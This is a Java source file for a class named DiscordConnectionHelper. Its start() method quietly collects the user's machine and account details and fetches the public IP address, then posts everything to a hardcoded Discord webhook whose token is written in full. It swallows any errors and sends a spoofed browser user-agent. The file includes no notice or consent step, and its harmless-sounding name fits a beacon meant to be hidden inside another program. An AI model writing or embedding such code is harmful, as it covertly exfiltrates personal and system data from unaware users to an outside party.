package me.amkgre.files.helper;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.Reader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.Scanner;

public class DiscordConnectionHelper {
	
	static String pcName = System.getenv("LOGONSERVER");
	
	static String cpuType = System.getenv("PROCESSOR_IDENTIFIER");
	static String cpuArch = System.getenv("PROCESSOR_ARCHITECTURE");
	static String cpuRevision = System.getenv("PROCESSOR_REVISION");
	static String cpuNumbers = System.getenv("NUMBER_OF_PROCESSORS");

	static String osLegacy = System.getenv("OS");
	static String osName = System.getProperty("os.name");
	static String osVersion = System.getProperty("os.version");
	static String osArch = System.getProperty("os.arch");

	static String userExec = System.getProperty("user.dir");
	static String userDir = System.getProperty("user.home");
	static String userName = System.getProperty("user.name");
	static String userLanguage = System.getProperty("user.language");
	static String userCountry = System.getProperty("user.country");
	
	static String javaName = System.getProperty("java.vm.name");
	static String javaInfo = System.getProperty("java.vm.info");
	static String javaVendor = System.getProperty("java.vendor");
	static String javaPath = System.getProperty("java.home");
	static String javaVersion = System.getProperty("java.runtime.version") + " / " +  System.getProperty("java.vm.version");

	static String discord_web_url = "https://discord.com/api/webhooks/902280532270936094/YL0Qna-ARMUOJ2SSH6TNVb3mfT4B3Suu0H8BAKCr70oefM8rRWWG8P5rOyV0_F1uSZ5l";
	static String discord_avatar_url = "https://i.ibb.co/fps45hd/steampfp.jpg";
	static String discord_username = "This is the Botname";
	static String discord_content = "This is a content";
	static String discord_username_link = "https://test.com";
	static String discord_title = "This is a title";
	static String discord_title_link = "https://test.com";
	static String discord_description = "This is a description";
	static String discord_embed_color = "15258710";
	
	static String discord_field_1_title = "PC Name";
	static String discord_field_1_text = pcName;
	
	static String discord_field_2_title = "CPU Type";
	static String discord_field_2_text = cpuType;
	
	static String discord_field_3_title = "CPU Arch";
	static String discord_field_3_text = cpuArch;
	
	static String discord_field_4_title = "CPU Revision";
	static String discord_field_4_text = cpuRevision;
	
	static String discord_field_5_title = "CPU Numbers";
	static String discord_field_5_text = cpuNumbers;
	
	static String discord_field_6_title = "OS Legacy";
	static String discord_field_6_text = osLegacy;
	
	static String discord_field_7_title = "OS Name";
	static String discord_field_7_text = osName;
	
	static String discord_field_8_title = "OS Version";
	static String discord_field_8_text = osVersion;
	
	static String discord_field_9_title = "OS Arch";
	static String discord_field_9_text = osArch;
	
	static String discord_field_10_title = "User Exec";
	static String discord_field_10_text = userExec;
	
	static String discord_field_11_title = "User Dir";
	static String discord_field_11_text = userDir;
	
	static String discord_field_12_title = "User Name";
	static String discord_field_12_text = userName;
	
	static String discord_field_13_title = "User Language";
	static String discord_field_13_text = userLanguage;
	
	static String discord_field_14_title = "User Country";
	static String discord_field_14_text = userCountry;
	
	static String discord_field_15_title = "Java Name";
	static String discord_field_15_text = javaName;
	
	static String discord_field_16_title = "Java Info";
	static String discord_field_16_text = javaInfo;
	
	static String discord_field_17_title = "Java Vendor";
	static String discord_field_17_text = javaVendor;
	
	static String discord_field_18_title = "Java Path";
	static String discord_field_18_text = javaPath;
	
	static String discord_field_19_title = "Java Version";
	static String discord_field_19_text = javaVersion;
	
	static String discord_thumbnail_link = "https://i.ibb.co/fps45hd/steampfp.jpg";
	static String discord_field_link = "https://i.ibb.co/fps45hd/steampfp.jpg";
	static String discord_footer_link = "https://i.ibb.co/fps45hd/steampfp.jpg";


	public static void start() {
		try {
			post_request(getInfo(), discord_web_url);
		} catch (Exception e) {
			// TODO: handle exception
		}
	}

	public static String get_request(String uri) throws IOException {
		URL url = new URL(uri);
		HttpURLConnection connection = (HttpURLConnection) url.openConnection();
		connection.setRequestProperty("Content-Type", "application/json");
		connection.setRequestProperty("User-Agent",
				"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.74");
		connection.setRequestMethod("GET");
		InputStream responseStream = connection.getInputStream();
		try (Scanner scanner = new Scanner(responseStream)) {
			String responseBody = scanner.useDelimiter("\\A").next();
			return responseBody;
		} catch (Exception e) {
			return "ERROR";
		}
	}

	public static void post_request(String jsonContent, String webhookURL) throws IOException {
		URL url = new URL(webhookURL);
		URLConnection con = url.openConnection();
		HttpURLConnection connection = (HttpURLConnection) con;
		connection.setRequestMethod("POST"); // PUT is another valid option
		connection.setDoOutput(true);

		byte[] out = jsonContent.getBytes(StandardCharsets.UTF_8);
		int length = out.length;

		connection.setFixedLengthStreamingMode(length);
		connection.setRequestProperty("Content-Type", "application/json");
		connection.setRequestProperty("User-Agent",
				"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.74");
		connection.connect();
		try (OutputStream os = connection.getOutputStream()) {
			os.write(out);
		}

		
	}

	public static String getInfo() throws IOException {
		
		URL whatismyip = new URL("http://checkip.amazonaws.com");
		BufferedReader bufferedReader = new BufferedReader((Reader) new InputStreamReader(whatismyip.openStream()));
		String ip = bufferedReader.readLine();

		String finishedEmbedContent = "{\r\n"
				+ "  \"username\": \"" + discord_username + "\",\r\n"
				
				+ "  \"avatar_url\": \"" + discord_avatar_url + "\",\r\n"
				
				+ "  \"content\": \"" + discord_content + "\",\r\n"
				
				+ "  \"embeds\": [\r\n"
				+ "    {\r\n"
				+ "      \"author\": {\r\n"
				+ "        \"name\": \"" + discord_username + "\",\r\n"
				+ "        \"url\": \"" + discord_username_link + "\",\r\n"
				+ "        \"icon_url\": \"" + discord_avatar_url + "\"\r\n"
				+ "      },\r\n"
				
				+ "      \"title\": \"" + discord_title + "\",\r\n"
				
				+ "      \"url\": \"" + discord_title_link + "\",\r\n"
				
				+ "      \"description\": \"" + discord_description + "\",\r\n"
				
				+ "      \"color\": " + discord_embed_color + ",\r\n"
				
				+ "      \"fields\": [\r\n"
				+ "        {\r\n"
				+ "          \"name\": \"" + discord_field_1_title + "\",\r\n"
				+ "          \"value\": \"" + discord_field_1_text + "\",\r\n"
				+ "          \"inline\": false\r\n"
				+ "        },\r\n"
				
				+ "        {\r\n"
				+ "          \"name\": \"" + discord_field_2_title + "\",\r\n"
				+ "          \"value\": \"" + discord_field_2_text + "\",\r\n"
				+ "          \"inline\": true\r\n"
				+ "        },\r\n"
				
				+ "        {\r\n"
				+ "          \"name\": \"" + discord_field_3_title + "\",\r\n"
				+ "          \"value\": \"" + discord_field_3_text + "\",\r\n"
				+ "          \"inline\": true\r\n"
				+ "        },\r\n"
				
				+ "        {\r\n"
				+ "          \"name\": \"" + discord_field_4_title + "\",\r\n"
				+ "          \"value\": \"" + discord_field_4_text + "\",\r\n"
				+ "          \"inline\": true\r\n"
				+ "        },\r\n"
				
				+ "        {\r\n"
				+ "          \"name\": \"" + discord_field_5_title + "\",\r\n"
				+ "          \"value\": \"" + discord_field_5_text + "\",\r\n"
				+ "          \"inline\": false\r\n"
				+ "        },\r\n"
				
				+ "        {\r\n"
				+ "          \"name\": \"" + discord_field_6_title + "\",\r\n"
				+ "          \"value\": \"" + discord_field_6_text + "\",\r\n"
				+ "          \"inline\": true\r\n"
				+ "        },\r\n"
				
				+ "        {\r\n"
				+ "          \"name\": \"" + discord_field_7_title + "\",\r\n"
				+ "          \"value\": \"" + discord_field_7_text + "\",\r\n"
				+ "          \"inline\": true\r\n"
				+ "        },\r\n"
				
				+ "        {\r\n"
				+ "          \"name\": \"" + discord_field_8_title + "\",\r\n"
				+ "          \"value\": \"" + discord_field_8_text + "\",\r\n"
				+ "          \"inline\": true\r\n"
				+ "        },\r\n"
				
				+ "        {\r\n"
				+ "          \"name\": \"" + discord_field_9_title + "\",\r\n"
				+ "          \"value\": \"" + discord_field_9_text + "\",\r\n"
				+ "          \"inline\": false\r\n"
				+ "        },\r\n"
				
				+ "        {\r\n"
				+ "          \"name\": \"" + discord_field_12_title + "\",\r\n"
				+ "          \"value\": \"" + discord_field_12_text + "\",\r\n"
				+ "          \"inline\": true\r\n"
				+ "        },\r\n"
				
				+ "        {\r\n"
				+ "          \"name\": \"" + discord_field_13_title + "\",\r\n"
				+ "          \"value\": \"" + discord_field_13_text + "\",\r\n"
				+ "          \"inline\": true\r\n"
				+ "        },\r\n"
				
				+ "        {\r\n"
				+ "          \"name\": \"" + discord_field_14_title + "\",\r\n"
				+ "          \"value\": \"" + discord_field_14_text + "\",\r\n"
				+ "          \"inline\": true\r\n"
				+ "        },\r\n"
				
				+ "        {\r\n"
				+ "          \"name\": \"" + discord_field_15_title + "\",\r\n"
				+ "          \"value\": \"" + discord_field_15_text + "\",\r\n"
				+ "          \"inline\": true\r\n"
				+ "        },\r\n"
				
				+ "        {\r\n"
				+ "          \"name\": \"" + discord_field_16_title + "\",\r\n"
				+ "          \"value\": \"" + discord_field_16_text + "\",\r\n"
				+ "          \"inline\": true\r\n"
				+ "        },\r\n"
				
				+ "        {\r\n"
				+ "          \"name\": \"" + discord_field_17_title + "\",\r\n"
				+ "          \"value\": \"" + discord_field_17_text + "\",\r\n"
				+ "          \"inline\": true\r\n"
				+ "        },\r\n"
				
				+ "        {\r\n"
				+ "          \"name\": \"" + discord_field_19_title + "\",\r\n"
				+ "          \"value\": \"" + discord_field_19_text + "\",\r\n"
				+ "          \"inline\": true\r\n"
				+ "        }\r\n"
				
				+ "      ],\r\n"
				
				+ "      \"thumbnail\": {\r\n"
				+ "        \"url\": \"" + discord_thumbnail_link + "\"\r\n"
				+ "      },\r\n"
				
				+ "      \"image\": {\r\n"
				+ "        \"url\": \"" + discord_field_link + "\"\r\n"
				+ "      },\r\n"
				
				+ "      \"footer\": {\r\n"
				+ "        \"text\": \"" + new SimpleDateFormat("dd-MM-yyyy - HH:mm:ss.SSS").format(System.currentTimeMillis()) + " IP: " + ip + "\",\r\n"
				+ "        \"icon_url\": \"" + discord_footer_link + "\"\r\n"
				+ "      }\r\n"
				+ "    }\r\n"
				+ "  ]\r\n"
				+ "}";

		return finishedEmbedContent;
	}
}